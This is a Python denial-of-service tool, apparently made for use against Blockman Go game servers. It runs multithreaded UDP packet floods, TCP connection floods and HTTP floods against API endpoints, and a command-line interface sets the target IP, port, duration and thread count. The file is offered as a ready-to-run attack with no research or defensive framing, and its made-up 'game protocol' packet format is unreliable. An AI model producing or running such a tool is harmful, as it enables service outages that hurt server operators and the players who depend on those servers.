#!/usr/bin/env python3
import socket
import threading
import time
import random
import sys
import os
import struct
from argparse import ArgumentParser

class BlockmanGoDDoS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.packet_count = 0
        
    def banner(self):
        print("""
        ╔═══════════════════════════════════════╗
        ║     BLOCKMAN GO DDOS TOOL - v1.0     ║
        ║     Author: KSOHMK                   ║
        ║     Target: Blockman Go Servers      ║
        ╚═══════════════════════════════════════╝
        """)
    
    def create_blockman_packet(self, packet_type=0x01):
        """Create a Blockman Go protocol packet"""
        # Blockman Go uses custom packet structure
        # This simulates game client packets
        packet = bytearray()
        
        # Packet header (common structure)
        packet.extend(struct.pack('!H', 0x0A0B))  # Magic bytes
        packet.extend(struct.pack('!H', packet_type))  # Packet type
        packet.extend(struct.pack('!I', int(time.time())))  # Timestamp
        packet.extend(struct.pack('!I', random.randint(1000, 9999)))  # Random session ID
        
        # Add random payload to simulate game data
        payload_size = random.randint(50, 200)
        packet.extend(random._urandom(payload_size))
        
        # Packet footer
        packet.extend(struct.pack('!H', 0xFFFF))  # End marker
        
        return bytes(packet)
    
    def udp_flood(self, target_ip, target_port, duration):
        """UDP flood targeting Blockman Go servers"""
        self.attack_running = True
        timeout = time.time() + duration
        
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(1)
                
                # Send different packet types to simulate various game actions
                packet_types = [0x01, 0x02, 0x03, 0x04, 0x05]  # Movement, chat, etc.
                packet = self.create_blockman_packet(random.choice(packet_types))
                
                s.sendto(packet, (target_ip, target_port))
                self.packet_count += 1
                s.close()
            except:
                pass
    
    def tcp_flood(self, target_ip, target_port, duration):
        """TCP connection flood for Blockman Go"""
        self.attack_running = True
        timeout = time.time() + duration
        
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                
                # Try to establish connection
                s.connect((target_ip, target_port))
                
                # Send initial handshake packet
                handshake = self.create_blockman_packet(0x00)  # Handshake packet
                s.send(handshake)
                
                # Keep connection alive briefly
                time.sleep(0.1)
                s.close()
                self.packet_count += 1
            except:
                pass
    
    def http_api_flood(self, target_ip, duration):
        """HTTP API flood targeting Blockman Go web services"""
        self.attack_running = True
        timeout = time.time() + duration
        
        # Common Blockman Go API endpoints
        endpoints = [
            "/api/v1/auth/login",
            "/api/v1/user/profile",
            "/api/v1/room/list",
            "/api/v1/game/join",
            "/api/v1/chat/send"
        ]
        
        while time.time() < timeout and self.attack_running:
            try:
                endpoint = random.choice(endpoints)
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, 80))
                
                # Create HTTP request
                headers = {
                    'User-Agent': 'BlockmanGo/1.0 (Android; 11)',
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Connection': 'close',
                    'X-Game-Version': '1.0.0',
                    'X-Device-ID': ''.join(random.choice('0123456789abcdef') for _ in range(16))
                }
                
                request = f"GET {endpoint} HTTP/1.1\r\nHost: {target_ip}\r\n"
                for header, value in headers.items():
                    request += f"{header}: {value}\r\n"
                request += "\r\n"
                
                s.send(request.encode())
                s.close()
                self.packet_count += 1
            except:
                pass
    
    def stop_attack(self):
        self.attack_running = False
        for thread in self.threads:
            thread.join()
        self.threads = []
        print(f"\n[!] Attack stopped. Total packets sent: {self.packet_count}")
    
    def run(self):
        self.banner()
        
        parser = ArgumentParser(description="Blockman Go DDOS Tool")
        parser.add_argument("-t", "--target", help="Target server IP", required=True)
        parser.add_argument("-p", "--port", type=int, help="Target port (default: 19132)", default=19132)
        parser.add_argument("-d", "--duration", type=int, help="Attack duration in seconds", default=60)
        parser.add_argument("-th", "--threads", type=int, help="Number of threads", default=50)
        parser.add_argument("-m", "--mode", choices=['udp', 'tcp', 'http'], help="Attack mode (default: udp)", default='udp')
        
        args = parser.parse_args()
        
        target = args.target
        port = args.port
        duration = args.duration
        threads = args.threads
        mode = args.mode
        
        print(f"[+] Target: {target}")
        print(f"[+] Port: {port}")
        print(f"[+] Duration: {duration} seconds")
        print(f"[+] Threads: {threads}")
        print(f"[+] Mode: {mode.upper()}")
        
        # Common Blockman Go server ports
        if port == 19132:
            print("[+] Using default Blockman Go port (19132)")
        elif port == 80:
            print("[+] Using HTTP API mode")
        
        print("\n[!] Starting Blockman Go attack... Press Ctrl+C to stop")
        
        try:
            for i in range(threads):
                if mode == 'udp':
                    thread = threading.Thread(target=self.udp_flood, args=(target, port, duration))
                elif mode == 'tcp':
                    thread = threading.Thread(target=self.tcp_flood, args=(target, port, duration))
                elif mode == 'http':
                    thread = threading.Thread(target=self.http_api_flood, args=(target, duration))
                
                thread.daemon = True
                thread.start()
                self.threads.append(thread)
            
            # Show progress
            start_time = time.time()
            try:
                while self.attack_running:
                    elapsed = int(time.time() - start_time)
                    remaining = duration - elapsed
                    if remaining <= 0:
                        break
                    print(f"\r[*] Time elapsed: {elapsed}s | Packets sent: {self.packet_count} | Time remaining: {remaining}s", end="")
                    time.sleep(1)
                self.stop_attack()
            except KeyboardInterrupt:
                self.stop_attack()
                
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
            sys.exit(1)

if __name__ == "__main__":
    if os.name == "nt":
        print("[!] This tool is designed for Linux/Termux only")
        sys.exit(1)
    
    tool = BlockmanGoDDoS()
    tool.run()